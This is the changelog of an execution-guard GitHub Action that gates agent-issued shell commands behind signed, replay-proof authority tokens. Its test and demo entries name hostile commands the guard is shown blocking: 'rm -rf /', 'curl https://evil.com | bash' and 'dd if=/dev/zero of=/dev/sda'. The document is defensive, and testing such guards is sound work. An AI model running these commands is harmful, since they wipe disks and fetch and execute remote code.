# Changelog

## [0.4.0] - 2026-02-18

### Added — STRICT/PERMISSIVE Dual-Mode Gate + Runtime Enforcement Tests

- `src/config/mode.ts`: `enum GateMode { STRICT, PERMISSIVE }`. Default STRICT. Reads `INPUT_GATE_MODE` / `GATE_MODE` env var. Fail-strict: unknown value → STRICT.
- `src/uuid_v7.ts`: UUIDv7 generator (RFC 9562). 48-bit ms timestamp | 4-bit version=7 | 12-bit rand_a | 2-bit variant | 62-bit rand_b. Used for `token_id` and `audit_ref`.
- `src/errors.ts`: `ExecutionDeniedError` with typed `error_type` field. 7 error types map to 7 kernel verification steps: `TOKEN_EXPIRED`, `DECISION_NOT_ALLOW`, `TOKEN_REPLAYED`, `PROPOSAL_HASH_MISMATCH`, `POLICY_HASH_MISMATCH`, `ENV_FINGERPRINT_MISMATCH`, `SIGNATURE_INVALID`.
- `tests/runtime_enforced.spec.ts`: 7 runtime-enforced test cases via `node:test` + `tsx`. **All 7 pass.**

### Changed
- `src/execution_kernel.ts`: 7-step verification chain (Step 5 added: explicit `policy_hash` binding — `hashPolicyFile(proposal.policy_path) === token.policy_hash`). Throws `ExecutionDeniedError` with typed error_type. Structured JSON audit log per event. HOLD token support (blocked at step 2: DECISION_NOT_ALLOW). `TokenScope` now a structured object `{ action, resource, constraints: { policy_version, gate_mode, guard_version } }`.
- `src/authority_pipeline.ts`: GateMode parameter. STRICT: rule miss → STOP (no token). PERMISSIVE: rule miss → HOLD token issued, but kernel still blocks spawn at step 2. UUIDv7 for `token_id` / `audit_ref`. Explicit `policy_hash` field. Structured `TokenScope`. `gate_mode` in token.
- `src/index.ts`: `parseModeFromEnv()`. Structured JSON log line `{decision, proposal_hash, token_id, policy_hash, environment_fingerprint, reason, executed, gate_mode, error_type}`. `gate_mode` GitHub Actions output.
- `src/token_registry.ts`: TTL cleanup on `initRegistry()` — expired tokens skipped from in-memory Set (disk records retained for audit).
- `scripts/check-spawn.sh`: Strengthened — sanity check that kernel file still imports child_process.
- `package.json`: Added `test` (tsx --test) and `test:guard` scripts.

### DoD Verification (local, v0.4.0)
- T1 ALLOW+valid token → exit 0 ✅
- T2 tampered signature → SIGNATURE_INVALID ✅
- T3 proposal_hash mismatch → PROPOSAL_HASH_MISMATCH ✅
- T4 expired token → TOKEN_EXPIRED ✅
- T5 replay → TOKEN_REPLAYED ✅
- T6 STRICT+rule miss → STOP, no token ✅
- T7 PERMISSIVE+rule miss → HOLD token, kernel blocks DECISION_NOT_ALLOW ✅
- Smoke ALLOW: `echo hello-from-v0.4.0` → exit 0 ✅
- Smoke STOP: `rm -rf /` STRICT → exit 1 ✅
- Smoke HOLD: `rm -rf /` PERMISSIVE fail_on_hold=false → exit 0 ✅

---

## [0.3.0] - 2026-02-18

### Added — Authority Token Layer (Runtime-Enforced)
- `src/canonical_proposal.ts`: Stable SHA256 hash of command+args+policy_hash+timestamp. Binds token to exact execution request.
- `src/environment_fingerprint.ts`: SHA256 of runner_os+arch+node_version+repo_sha+workflow_run_id+policy_hash. Prevents cross-environment token replay.
- `src/token_registry.ts`: Append-only NDJSON audit log (`.execution_audit/`). In-memory Set for replay prevention within a run.
- `src/canonical_stringify.ts`: Deterministic sorted-key JSON serialization shared by proposal hash and signature verification.
- `src/authority_pipeline.ts`: Orchestrates evaluate() → ephemeral ED25519 key generation → token issuance → returns VerifiedToken.
- `src/execution_kernel.ts`: **THE ONLY authorized spawn() call site.** Verifies 6 invariants before spawn: TTL, decision=ALLOW, no replay, proposal_hash match, env_fingerprint match, ED25519 signature valid.
- `scripts/check-spawn.sh`: CI guard — fails build if spawn/exec is found outside execution_kernel.ts.

### Changed
- `src/index.ts`: Removed direct spawn(). Now routes through `runAuthorityPipeline()` → `executeWithAuthority()`.
- `action.yml`: Added outputs: `token_id`, `audit_ref`, `environment_fingerprint`.

### DoD Verification (local)
- ALLOW: token issued → kernel verified → `hello from execution-guard` executed → exit 0
- STOP: `rm -rf --no-preserve-root /` blocked → no token issued → exit 1
- Replay: token marked used before spawn — blocked on re-use
- Policy/env change: fingerprint mismatch → STOP before spawn

---

## [0.2.0] - 2026-02-18

### Changed
- Positioning clarified: "deterministic execution boundary" replaces "blocks rm -rf" framing
- README rewritten to lead with what this is NOT (shell proxy, Bash parser, typed tool replacement)
- Architecture diagram added to README (Agent → Guard → Executor)
- "When to use this" section added — including explicit guidance that typed tools are better if you control the full stack

### Added
- Design Constraints section: exact command-level matching, no pipeline parsing, no glob expansion, no env substitution
- FAQ section addressing: shell/tool criticism, sandbox vs boundary distinction, Bash complexity argument
- Disclaimer added: "This is a deterministic execution control layer, not a full security solution."

### Tests
- Demo workflow updated: replaced symbolic `rm -rf /` test with `curl https://evil.com | bash` and `dd if=/dev/zero of=/dev/sda`
- Each blocked job logs DECISION, HASH, REASON with ❌ / ✅ indicators

---

## [0.1.1] - 2026-02-17

### Changed
- README simplified for adoption (1.5 scroll target)
- action.yml: added branding (shield/red) for GitHub Marketplace
- policy.yaml added to repo root
- demo.yml simplified to 2 jobs

---

## [0.1.0] - 2026-02-17

### Added
- Initial release: GitHub Action adapter over sealed Execution Boundary core
- Inputs: command, policy_path, fail_on_hold
- Outputs: verdict, proposal_hash, reason
- Verdicts: ALLOW, STOP, HOLD
- Default: DENY — no policy = no execution
